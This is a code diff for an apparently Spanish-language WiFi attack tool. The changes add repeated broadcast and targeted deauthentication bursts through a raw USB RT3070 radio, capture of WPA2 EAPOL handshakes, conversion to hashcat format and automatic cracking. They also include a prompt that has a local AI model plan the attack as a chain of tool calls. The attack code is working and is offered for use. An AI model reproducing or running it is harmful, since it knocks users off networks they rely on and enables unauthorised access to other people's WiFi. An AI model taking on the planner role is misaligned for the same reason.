@@ -954,8 +954,55 @@ async function hunterCycle() {
   const t = window._hunterTarget;
   const cy = ++window._hunterCycle;
   try {
-    log('[cazador] ciclo ' + cy + ': ráfaga deauth + watcher en ' + t.bssid + (t.channel ? ' CH' + t.channel : ''), 'info');
-    const r = await window.iaDeauthBurst({ bssid: t.bssid, channel: t.channel, target_mac: null, _hunter: true, sustained: true });
+    // E0-30: NUNCA fabricar un cliente con clave falsa (su M2 lleva el MIC
+    // de esa clave inventada y jamás sirve para la clave real). Primero
+    // detectamos STAs reales asociadas al BSSID.
+    const rep = await window.__invoke('detect_adapters');
+    const ad = ((rep && rep.adapters) || []).find(a => a.guid && (a.monitor_active || a.monitor_capable));
+    if (!ad) throw new Error('sin adaptador monitor/Npcap');
+    await window.__invoke('activate_monitor', { ifaceGuid: ad.guid, channel: t.channel });
+    await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: t.channel });
+    // Verificación real del canal por beacons (el readback OID es cacheado).
+    try {
+      const vr = await window.__invoke('verify_channel_rf', { guid: ad.guid, secs: 3, bssid: t.bssid });
+      log('[cazador] verify_channel_rf: ' + vr, 'info');
+      const m = String(vr).match(/canal dominante: (\\d+)/);
+      const dom = m ? parseInt(m[1]) : null;
+      if (dom !== null && dom !== t.channel) {
+        log('[cazador] canal real CH' + dom + ' != CH' + t.channel + ' — abortando ciclo', 'error');
+        window._hunterRunning = false;
+        if (window._hunterActive) window._hunterTimer = setTimeout(hunterCycle, 15000);
+        return;
+      }
+    } catch (e) { log('[cazador] verify_channel_rf: ' + e, 'warn'); }
+    const cs = await window.__invoke('detect_clients', { ifaceGuid: ad.guid, bssid: t.bssid, durationSecs: 30 });
+    const knownBssids = new Set((lastNets || []).map(n => String(n.bssid || '').toUpperCase()));
+    const clients = ((cs && cs.clients) || [])
+      .map(m => String(m).toUpperCase())
+      .filter(m => /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(m) && !knownBssids.has(m));
+    let broadcast = clients.length > 0 && (cy % 2 === 0);
+    if (!clients.length) {
+      // E0-30: no fabricar un cliente con clave falsa. Pero un STA idle (sin
+      // tramas Data en 30 s) es invisible para detect_clients: parar aquí
+      // (como antes, a los 3 ciclos) significaba NUNCA emitir el broadcast
+      // deauth que fuerza su reconexión → nunca llegaba M1/M2.
+      // P4 (2026-11-26): aunque no haya clientes detectados, igual emitimos
+      // deauth BROADCAST para forzar la reconexión de los STAs idle/asociados.
+      window._hunterNoClientCycles = (window._hunterNoClientCycles || 0) + 1;
+      broadcast = true;
+      log('[cazador] ' + ((cs && cs.message) || 'sin clientes reales') +
+          ' — deauth BROADCAST igual (' + window._hunterNoClientCycles + 'º): fuerza la reconexión de ' +
+          'los clientes idle. No se fabrica cliente falso.', 'warn');
+    } else {
+      window._hunterNoClientCycles = 0;
+      const sta = clients[0];
+      log('[cazador] ciclo ' + cy + ': cliente real ' + sta + ' → deauth ' + (broadcast ? 'BROADCAST' : 'dirigido a ' + sta) + ' + watcher EAPOL.', 'info');
+    }
+    // P4: deauth en CADA ciclo (dirigido si hay STA real, broadcast si no).
+    // Antes, con «sin clientes», el cazador no emitía deauth y el cliente idle
+    // jamás recibía M1/M2 → nunca había material EAPOL.
+    log('[cazador] deauth ' + (broadcast ? 'BROADCAST' : 'dirigido a ' + clients[0]) + '.', 'info');
+    const r = await window.iaDeauthBurst({ bssid: t.bssid, channel: t.channel, target_mac: broadcast ? null : clients[0], _hunter: true, sustained: true, watch_secs: 90 });
     const st = window._hunterStats || (window._hunterStats = { passes: 0, frames: 0, packets: 0, eapol: 0 });
     st.passes += (r && r.passes) || 0;
     st.frames += ((r && r.passes) || 0) * 2;
@@ -967,40 +1014,32 @@ async function hunterCycle() {
           ' frames con TXDONE · ' + st.packets + ' paquetes capturados · ' + st.eapol +
           ' EAPOL · ' + (st.eapol ? 'material capturado' : 'sin material todavía'), 'info');
     }
-    if (r && r.success && r.hashes > 0) {
-      log('[cazador] ⚡ HANDSHAKE CAPTURADO: ' + r.output_file + ' (' + r.hashes + ' hashes) · pcapng ' + r.pcapng, 'ok');
-      hunterStatus('⚡ capturado');
-      // M-12: NO parar definitivamente. Pausa temporal (aborta la ráfaga) y
-      // se reanuda sobre la MISMA red cuando termina el auto-crack, salvo
-      // que el usuario haya pulsado Detener.
-      pauseHunterForAttack();
-      await autoCrackHandshake(r.output_file, t.ssid, t.bssid);
-      return;
+    // E0-Linux: RX RAW del RT73 (EP 0x81) + conversor, igual que en Linux.
+    if (r && r.success) {
+      try {
+        const rx = await window.__invoke('usb_raw_rx', { durationSecs: 18 });
+        if (!(rx && rx.success && rx.output_file)) {
+          log('[cazador] RX raw falló: ' + String((rx && rx.message) || '?').slice(0, 100), 'warn');
+        } else {
+          const conv = await window.__invoke('convert_ethernet_eapol', { pcapPath: rx.output_file, ssid: t.ssid, bssid: t.bssid });
+          const hashes = parseInt(conv && conv.hashes || 0) || 0;
+          log('[cazador] RX raw ' + (rx.packets || 0) + ' pkts → ' +
+              (hashes > 0 ? '⚡ EAPOL válido: ' + hashes + ' hash(es) → ' + (conv && conv.output_file) : 'EAPOL sin hash válido'),
+              hashes > 0 ? 'ok' : 'warn');
+          if (hashes > 0) {
+            hunterStatus('⚡ capturado');
+            pauseHunterForAttack();
+            await autoCrackHandshake(conv.output_file, t.ssid, t.bssid);
+            return;
+          }
+        }
+      } catch (e) { log('[cazador] RX/conv error: ' + e, 'warn'); }
     }
     if (window._hunterPaused) log('[cazador] ciclo ' + cy + ' abortado por inicio de ataque (pausa).', 'info');
     else if (window._hunterStopRequested) log('[cazador] ciclo ' + cy + ' abortado por Detener.', 'warn');
     else log('[cazador] ciclo ' + cy + ' sin material' + (r && r.message ? ' · ' + String(r.message).slice(0, 120) : '') + '.', 'warn');
   } catch (e) {
-    const em = String(e);
-    // M-08c: si el RT3070 sigue en netr28ux, el deauth por WinUSB es
-    // imposible. En vez de repetir 20 ciclos inútiles, usar la vía YA
-    // verificada de dos radios: RT73 en monitor + cliente falso netr28ux.
-    if (/netr28ux|WinUSB|Operation not supported/i.test(em) && t.ssid) {
-      log('[cazador] RT3070 sin WinUSB: cambio al gatillo de dos radios (RT73 monitor + cliente netr28ux).', 'warn');
-      try {
-        const g = await window.iaTriggerHandshake({ bssid: t.bssid, ssid: t.ssid, channel: t.channel });
-        if (g && g.success && Number(g.hashes || 0) > 0) {
-          log('[cazador] ⚡ HANDSHAKE CAPTURADO por gatillo: ' + g.output_file + ' (' + g.hashes + ' hashes)', 'ok');
-          hunterStatus('⚡ capturado');
-          pauseHunterForAttack();
-          await autoCrackHandshake(g.output_file, t.ssid, t.bssid);
-          return;
-        }
-        log('[cazador] gatillo sin material: ' + ((g && g.message) || '?'), 'warn');
-      } catch (ge) { log('[cazador] gatillo falló: ' + ge, 'error'); }
-    } else {
-      log('[cazador] error en ciclo ' + cy + ': ' + em, 'error');
-    }
+    log('[cazador] error en ciclo ' + cy + ': ' + String(e) + '. Sin cliente falso: se requiere TX real del RT3070 (WinUSB).', 'error');
   } finally {
     window._hunterRunning = false;
   }
@@ -1089,7 +1128,10 @@ async function restoreRadioAfterAttack() {
 async function recoverScanIfMonitor() {
   try {
     const rep = await window.__invoke('detect_adapters');
-    const ad = ((rep && rep.adapters) || []).find(a => a.guid);
+    // Elegir la radio WiFi real (RT73), no el primer adaptador con GUID:
+    // el RT3070 ahora está en WinUSB y no es un adaptador "Wi-Fi" para netsh.
+    const ads = ((rep && rep.adapters) || []).filter(a => a.guid);
+    const ad = ads.find(a => a.monitor_capable) || ads[0];
     if (!ad) return null;
     const st = await window.__invoke('monitor_status', { ifaceGuid: ad.guid });
     if (!st || !/monitor/i.test(st.mode || '')) return null;
@@ -1560,9 +1602,9 @@ window.iaAttack = async function () {
       'RESPONDE SOLO con bloques <tool_call>{"name":"nombre","arguments":{...}}</tool_call>, uno por herramienta, sin texto ni numeración.',
       'Devuelve un plan COMPLETO de al menos 3 herramientas: NUNCA solo profile_target. El objetivo ya está validado en el último scan.',
       'Usa únicamente los nombres de las funciones disponibles y argumentos JSON reales. Máximo ' + IA_MAX_STEPS + ' pasos.',
-      'ESTRATEGIA UNIVERSAL (sirve para CUALQUIER red WPA2, incluidos hotspots/móviles): usa trigger_handshake con el BSSID/SSID/canal reales — es la vía verificada con dos radios (RT73 monitor + RT3070 cliente) y NO necesita clientes ni deauth. No propongas pmkid_probe (veredicto negativo medido), ni wps_pin, ni deauth por Npcap. Con material .22000 ve directo a inspect_hash/crack_hash. Termina con restore_managed si activaste monitor.',
+      'ESTRATEGIA UNIVERSAL: para capturar un handshake sirve SOLO un cliente REAL que conozca la clave. Usa detect_clients sobre el BSSID; si hay STAs, deauth_burst dirigido a esa MAC y captura su reconexión. NUNCA uses trigger_handshake: fabrica un cliente con clave inventada y su M2 no sirve. No propongas pmkid_probe ni wps_pin. Con material .22000 ve directo a inspect_hash/crack_hash. Termina con restore_managed si activaste monitor.',
       'Para convert_pcap/inspect_hash/crack_hash puedes poner rutas de marcador de posición: el orquestador las sustituirá por los archivos reales generados en cada paso.',
-      'Si el PMF no se puede medir, NO bloquees el ataque: trigger_handshake es universal y no envía deauth. Solo MFPR=1 confirmado bloquea.',
+      'Si el PMF no se puede medir, NO bloquees el ataque: usa deauth dirigido a cliente real. Solo MFPR=1 confirmado bloquea. Si no hay clientes, dilo y no fabriques material.',
       'genera_dictionary_ai y crack_hash también son universales: si no hay clave en wordlists conocidas, pide candidatas a Ollama y crackea con crack_custom manual.',
     ].join('\n') + (window.iaMemoryContext ? await window.iaMemoryContext() : '');
     const model = valOrEmpty($('ia-model')?.value) || null;
@@ -1574,7 +1616,9 @@ window.iaAttack = async function () {
     // M-15: herramienta generadora de tráfico ÚTIL en este HW. La vía
     // universal es trigger_handshake (dos radios, sin clientes, sin deauth);
     // deauth_burst sigue contando cuando el RT3070 está en WinUSB.
-    const hasForced = () => steps.some(s => ['deauth_burst', 'trigger_handshake'].includes(String((s && s.name) || '')));
+    // E0-30: solo cuenta deauth a cliente REAL. trigger_handshake falsifica
+    // la clave y produce un M2 inútil, así que no puede ser la acción válida.
+    const hasForced = () => steps.some(s => String((s && s.name) || '') === 'deauth_burst');
     // Plan mínimo obligatorio: si el modelo se queda corto o solo propone
     // consultas/capturas, completar YA (sin otro viaje a Ollama) con
     // HERRAMIENTAS IA (nunca el pipeline determinista). Se anota en el log.
@@ -1587,7 +1631,7 @@ window.iaAttack = async function () {
           ]
         : [
             { name: 'profile_target', arguments: { bssid } },
-            { name: 'trigger_handshake', arguments: { bssid, channel: ch, ssid } },
+            { name: 'deauth_burst', arguments: { bssid, channel: ch } },
             { name: 'inspect_hash', arguments: { hash_path: '/path/to/hash.22000' } },
             { name: 'crack_hash', arguments: { hash_file: '/path/to/hash.22000', ssid, bssid } },
           ]).filter(x => !have.has(x.name));
@@ -1642,8 +1686,11 @@ window.iaAttack = async function () {
         log(`[IA] Paso ${i + 1}/${total} omitido (${name}): la conversión dio 0 hashes; no se inspecciona/crackea un .22000 vacío.`, 'warn');
         continue;
       }
-      // M-15: trigger_handshake se EJECUTA (es la vía universal verificada
-      // con dos radios); no se omite como versión anterior.
+      // E0-30: el cliente falso usa una clave inventada; su M2 no sirve.
+      if (name === 'trigger_handshake') {
+        log(`[IA] Paso ${i + 1}/${total} omitido (trigger_handshake): clave falsa; se usa deauth a cliente real.`, 'warn');
+        continue;
+      }
       const v = window.iaValidateTool(name, args);
       if (!v.ok) { log(`[IA] Paso ${i + 1}/${total} rechazado (${name}): ${v.error}`, 'warn'); failCount++; continue; }
       let confirmMsg = `Paso ${i + 1}/${total}: ${name}\nArgumentos: ${JSON.stringify(args)}`;
@@ -1776,6 +1823,29 @@ window.iaDeauthBurst = async function (args) {
     const sc = await window.__invoke('set_monitor_channel', { ifaceGuid: ad.guid, channel: ch });
     if (!(sc && sc.success)) log('[deauth] aviso: no se pudo fijar el canal del monitor: ' + ((sc && sc.message) || '?'), 'warn');
   } catch (e) { log('[deauth] aviso set_monitor_channel: ' + e, 'warn'); }
+  // Verificación real del canal por beacons (el readback OID es cacheado).
+  // Si el canal RF NO coincide, abortar de verdad el TX: antes el throw caía
+  // en este catch, que solo logueaba, y la ráfaga seguía en canal equivocado.
+  let vrOk = true;
+  try {
+    const vr = await window.__invoke('verify_channel_rf', { guid: ad.guid, secs: 3, bssid });
+    log('[deauth] verificación RF: ' + vr, 'info');
+    const m = String(vr).match(/canal dominante: (\d+)/);
+    const dom = m ? parseInt(m[1]) : null;
+    const t = String(vr).match(/beacons objetivo: (\S+)/);
+    const hits = t && t[1] !== 'n/d' ? parseInt(t[1]) : null;
+    if (dom !== null && dom !== ch) {
+      vrOk = false;
+      throw new Error('canal RF real es CH' + dom + ', no CH' + ch + ' → 0 EAPOL seguro. Abortando TX.');
+    }
+    if (hits === 0) {
+      vrOk = false;
+      throw new Error('el AP objetivo no emite beacons en CH' + ch + ' → el canal no es el suyo. Abortando TX.');
+    }
+  } catch (e) {
+    if (!vrOk) throw e;   // aborte real del TX (no silenciar)
+    log('[deauth] verify_channel_rf: ' + e, 'warn');
+  }
   // M-08c: el preflight de canal asume WinUSB. Si el RT3070 sigue reclamado
   // por netr28ux (experimento de dos radios), rt3070_chan_preflight devuelve
   // "open: Operation not supported" — dar la causa real y la salida, sin
@@ -1790,26 +1860,29 @@ window.iaDeauthBurst = async function (args) {
   if (!(pf && pf.ok)) throw new Error((pf && pf.message) || 'preflight TX falló');
   log('[deauth] ' + (pf.message || 'preflight OK'), 'ok');
 
-  window._eapolSeen = false;
-  const watcher = window.__invoke('capture_until_eapol', { ifaceGuid: ad.guid, bssid, durationSecs: 45 });
-  // Medido 2026-11-22: el chip acepta 2 frames por proceso y luego hace
-  // backpressure; con un init por pasada salen 2/2 con TXDONE cada vez.
-  // 4 pasadas × 2 frames = 8 frames broadcast (o 5 dirigidos: 3×2).
+  // El RT3070 (TX, WinUSB) y la radio monitor de captura (Npcap) son DOS
+  // radios distintas: pueden trabajar a la vez. Medido 2026-11-26: empezar la
+  // captura DESPUÉS de la ráfaga hacía perder M1/M2 (el cliente se reconecta
+  // durante los pasadas) y los .pcap salían con un M3 suelto → 0 hashes.
+  // Estrategia:
+  // 1) Arrancar el watcher ANTES de transmitir (captura continua).
+  // 2) Ráfaga de deauth; se corta sola en cuanto llega `eapol-detected`.
+  // 3) El watcher sigue grabando EAPOL_TAIL tras el primer frame (M1+M2+M3).
   const framesPerPass = 2;
-  const maxPasses = args.sustained ? 20 : (da ? 3 : 4);
+  const maxPasses = args.sustained ? 5 : (da ? 3 : 4);
+  const watchSecs = Math.max(15, Math.min(60, parseInt(args.watch_secs) || 30));
+  window._eapolSeen = false;
+  const watcher = window.__invoke('capture_until_eapol', { ifaceGuid: ad.guid, bssid, durationSecs: watchSecs, raw: true })
+    .catch(e => ({ success: false, message: String(e), packets: 0, eapol: false, output_file: '' }));
   let passes = 0, initFails = 0;
-  while (!window._eapolSeen && passes < maxPasses) {
+  while (passes < maxPasses) {
+    if (window._eapolSeen) { log('[deauth] EAPOL visto: paro TX para no romper M3/M4.', 'ok'); break; }
     if (window._simpleStop || (args._hunter && window._hunterStopRequested)) break;
     try {
       const ini = await window.__invoke('usb_raw_init', { channel: ch });
       if (!(ini && ini.success)) {
         initFails++;
-        log('[deauth] init falló (' + (ini && ini.message) + '): ' +
-          String((ini && ini.output) || '').split('\n').filter(l => l.trim()).slice(-3).join(' | '), 'warn');
-        if (initFails >= 3) {
-          log('[deauth] 3 fallos de init seguidos: paro de transmitir. Si el chip no responde, power-cycle físico del RT3070 (15 s).', 'error');
-          break;
-        }
+        if (initFails >= 3) { log('[deauth] 3 fallos de init: paro TX.', 'error'); break; }
         await new Promise(res => setTimeout(res, 1500));
         continue;
       }
@@ -1817,20 +1890,21 @@ window.iaDeauthBurst = async function (args) {
       const r = await window.__invoke('usb_raw_deauth', {
         bssid, channel: ch, count: framesPerPass, target_mac: da, reason: 7, delay_ms: 100,
       });
-      // En modo cazador no hace falta una línea por pasada: el resumen periódico
-      // da el mismo dato sin ahogar la consola.
-      if (!args._hunter || (passes + 1) % 5 === 0 || !(r && r.success)) {
+      if (!args._hunter || (passes + 1) % 3 === 0 || !(r && r.success)) {
         log('[deauth] pasada ' + (passes + 1) + '/' + maxPasses + ': ' + (r && r.message || 'sin respuesta'), (r && r.success) ? 'ok' : 'error');
       }
     } catch (e) { log('[deauth] error en pasada ' + (passes + 1) + ': ' + e, 'error'); }
     passes++;
     await new Promise(res => setTimeout(res, 1500));
   }
+  log('[deauth] ráfaga completada (' + passes + ' pasadas). Esperando al watcher EAPOL...', 'info');
   const cap = await watcher;
-  if (!(cap && cap.success)) throw new Error((cap && cap.message) || 'watcher falló');
+  if (!(cap && cap.success)) throw new Error((cap && cap.message) || 'captura fallo');
   if (!cap.eapol) return { success: false, output_file: cap.output_file, pcapng: cap.output_file, message: cap.message, passes };
   // Conversión + validación REAL: sin línea WPA*01/WPA*02 no hay material.
-  const conv = await window.__invoke('pcap_to_22000', { pcapPath: cap.output_file });
+  // El ESSID es obligatorio para hashcat (PMK se deriva de pass+ESSID):
+  // lo pasamos si lo sabemos; si no, el conversor lo lee de los beacons.
+  const conv = await window.__invoke('pcap_to_22000', { pcapPath: cap.output_file, ssid: args.ssid || null });
   let total = 0;
   if (conv && conv.success && conv.output_file) {
     try { const ins = await window.__invoke('inspect_hash', { hashPath: conv.output_file }); total = parseInt(ins && ins.total) || 0; } catch {}
@@ -2759,7 +2833,8 @@ window.startAutoAttack = async function () {
       } catch (e) { log(`[keygen] ${e}`, 'error'); return false; }
     }});
 
-    // Pasos RF solo si la inyección funciona (no es el caso en RT3070+Npcap).
+    // Pasos RF: si la inyección está soportada, añade WPS; si no (RT3070+Npcap),
+    // intenta deauth USB crudo + captura Npcap durante la reconexión.
     try {
       const inj = await window.__invoke('check_injection_capability', { ifaceGuid: natGuid || iface || '' });
       if (inj.supported) {
@@ -2770,9 +2845,41 @@ window.startAutoAttack = async function () {
         );
         log('Inyección disponible: se añaden pasos WPS.', 'ok');
       } else {
-        log('Inyección no disponible en este adaptador (esperado en RT3070+Npcap): se omiten los pasos RF.', 'warn');
+        // RT3070+Npcap: inyección no soportada por Npcap (err 31, Npcap #85).
+        // Intentar deauth por USB crudo (WinUSB) → cliente se reconecta → capturar handshake.
+        // NOTA: mientras el chip está en WinUSB, Npcap NO lo ve. El flujo:
+        //   1) usb_raw_init (canal + radio ON, sin kick FIRMWARE(8))
+        //   2) usb_raw_deauth (frames deauth al objetivo)
+        //   3) Esperar 2-5s para reconexión
+        //   4) usb_raw_restore (revertir a managed, Npcap vuelve a ver la antena)
+        //   5) Captura Npcap de EAPOL
+        // Si el chip RT3070 no está disponible o falla, se omite y sigue captura pasiva.
+        const st = await window.__invoke('usb_raw_status');
+        if (st.success && st.message && st.message.includes('vivo')) {
+          log('Inyección no soportada por Npcap: intentando deauth USB crudo + captura posterior.', 'warn');
+          // Init radio en canal del objetivo
+          await window.__invoke('usb_raw_init', { channel: autoCh9 || 11 });
+          log('Chip USB init OK, canal ' + (autoCh9 || 11), 'info');
+          // Deauth al objetivo (broadcast por defecto; si hay cliente específico, usar bssid+client)
+          const deauthR = await window.__invoke('usb_raw_deauth', { bssid, channel: autoCh9 || 11, count: 10, target_mac: undefined, reason: 7, delay_ms: 100 });
+          log('[usbraw] ' + deauthR.message, deauthR.success ? 'ok' : 'warn');
+          if (deauthR.success) {
+            // Dar tiempo al cliente para reconectar (2-5s típico)
+            log('Esperando reconexión del cliente (3s) para capturar handshake…', 'info');
+            await new Promise(r => setTimeout(r, 3000));
+            // Restaurar antenna a managed (Npcap la volverá a ver)
+            await window.__invoke('usb_raw_restore', {});
+            log('Antena restaurada a modo managed. Ahora capturing con Npcap…', 'info');
+          } else {
+            log('Deauth USB crudo falló; continuando con captura pasiva. Mensaje: ' + deauthR.message, 'warn');
+          }
+        } else {
+          log('Chip USB no disponible o no listo: se omiten pasos RF y se captura pasiva.', 'warn');
+        }
+        // Después del intento USB, continuar con la captura Npcap normal (paso 3/7 del auto-ataque)
+        // que ya está definido más abajo en los steps.push de native_capture
       }
-    } catch (e) { log('check_injection_capability: ' + e, 'warn'); }
+    } catch (e) { log('check_injection_capability/usb_raw: ' + e, 'warn'); }
   }
 
   window._autoStop = false;
@@ -3012,6 +3119,25 @@ const m = await window.__invoke('activate_monitor', { ifaceGuid: natGuid, channe
       } catch (e) { log('[adaptadores] ' + e, 'warn'); }
       if (window._simpleStop) throw new Error('cancelado');
 
+      // P6 (2026-11-26): el botón Atacar era 100% pasivo: capturaba sin
+      // transmitir deauth → sin M1/M2 jamás (cliente idle) → 0 hashes. Ahora,
+      // con objetivo conocido, arranca la ráfaga de deauth (watcher concurrente
+      // + parada en `eapol-detected`) y si obtuvo M1+M2 hereda su .22000.
+      // Si la ráfaga falla/no hay material, sigue a la captura pasiva honesta.
+      if (bssid && !hashFile && !natPcap) {
+        setStage('Deauthing + capturando EAPOL (CH ' + (ch || '?') + ')…', 28);
+        try {
+          const burst = await window.iaDeauthBurst({ bssid, channel: ch, target_mac: null, _hunter: false, sustained: false, watch_secs: 90 });
+          log('[deauth-atacar] ' + ((burst && burst.message) || 'sin resultado'), burst && burst.success ? 'ok' : 'warn');
+          if (burst && burst.success && burst.output_file) {
+            hashFile = burst.output_file;
+            const uhf = $('ultra-hash'); if (uhf) uhf.value = hashFile;
+            const cxf = $('crack-hash'); if (cxf) cxf.value = hashFile;
+            const ihf = $('insp-hash'); if (ihf) ihf.value = hashFile;
+            log('[convert] heredado del burst deauth: ' + burst.output_file, 'ok');
+          }
+        } catch (e) { log('[deauth-atacar] ' + e, 'warn'); }
+      }
       if (natGuid) {
         const dur = 60;
         setStage(`Capturando ${dur}s (CH ${ch || 'auto'}, pasivo)…`, 30);
